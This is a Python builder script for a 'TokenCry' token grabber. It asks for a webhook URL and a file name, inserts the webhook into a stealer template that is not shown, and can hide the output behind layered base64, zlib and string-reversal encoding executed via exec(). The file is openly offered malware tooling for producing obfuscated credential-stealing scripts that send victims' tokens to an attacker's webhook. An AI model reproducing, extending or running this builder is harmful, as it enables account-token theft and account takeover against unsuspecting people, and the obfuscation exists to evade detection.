import os
import shutil
import time
import sys
import base64
import zlib
from colorama import Fore, init, Style

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

clear()

logo = """
▄▄▄█████▓ ▒█████   ██ ▄█▀▓█████  ███▄    █  ▄████▄   ██▀███ ▓██   ██▓
▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓█   ▀  ██ ▀█   █ ▒██▀ ▀█  ▓██ ▒ ██▒▒██  ██▒
▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒███   ▓██  ▀█ ██▒▒▓█    ▄ ▓██ ░▄█ ▒ ▒██ ██░
░ ▓██▓ ░ ▒██   ██░▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒▒▓▓▄ ▄██▒▒██▀▀█▄   ░ ▐██▓░
  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░▒████▒▒██░   ▓██░▒ ▓███▀ ░░██▓ ▒██▒ ░ ██▒▓░
  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒ ░ ░▒ ▒  ░░ ▒▓ ░▒▓░  ██▒▒▒ 
    ░      ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░  ░  ▒     ░▒ ░ ▒░▓██ ░▒░ 
  ░      ░ ░ ░ ▒  ░ ░░ ░    ░      ░   ░ ░ ░          ░░   ░ ▒ ▒ ░░  
             ░ ░  ░  ░      ░  ░         ░ ░ ░         ░     ░ ░     
                                           ░                 ░ ░     
"""

print(Fore.GREEN + logo)
print(f"[{Fore.CYAN}!{Style.RESET_ALL}] Welcome to {Fore.GREEN}TokenCry{Style.RESET_ALL} grabber!")

webhook_url = input(f"\n[{Fore.CYAN}?{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Enter your Webhook URL: ")
name_file = input(f"\n[{Fore.CYAN}?{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Enter the name of the stealer: ")

if not name_file.strip():
    name_file = "stealer"

search_text = "WEBHOOK_HERE"
replace_text = webhook_url

template_grabber_path = "assets/grabber.py"
output_file_path = f"builder/{name_file}.py"

if not os.path.exists('builder'):
    os.makedirs('builder')

with open(template_grabber_path, 'r', encoding="utf-8") as f:
    code = f.read()

code = code.replace(search_text, replace_text)

obfuscate = input(f"\n[{Fore.CYAN}?{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Do you want to obfuscate the code? (y/n): ").lower()

if obfuscate == "y":
    def obfuscate_code(code):
        base64_encoded = base64.b64encode(code.encode('utf-8')).decode('utf-8')
        zlib_encoded = zlib.compress(base64_encoded.encode('utf-8'))
        zlib_encoded_base64 = base64.b64encode(zlib_encoded).decode('utf-8')
        reversed_encoded = zlib_encoded_base64[::-1]

        code = f'''import base64
import zlib
encoded_code = "{reversed_encoded}"
exec(base64.b64decode(zlib.decompress(base64.b64decode(encoded_code[::-1]))).decode('utf-8'))'''

        return code

    obfuscated_code = obfuscate_code(code)
    with open(output_file_path, 'w', encoding="utf-8") as output_file:
        output_file.write(obfuscated_code)

    print(f"\n[{Fore.CYAN}✔{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Obfuscated code successfully written to the new stealer script!")
else:
    with open(output_file_path, 'w', encoding="utf-8") as output_file:
        output_file.write(code)

print(f"[{Fore.CYAN}!{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Stealer file: {Fore.RED}{output_file_path}{Style.RESET_ALL}")
print(f"\n[{Fore.CYAN}✔{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Finished creating the token grabber script!")
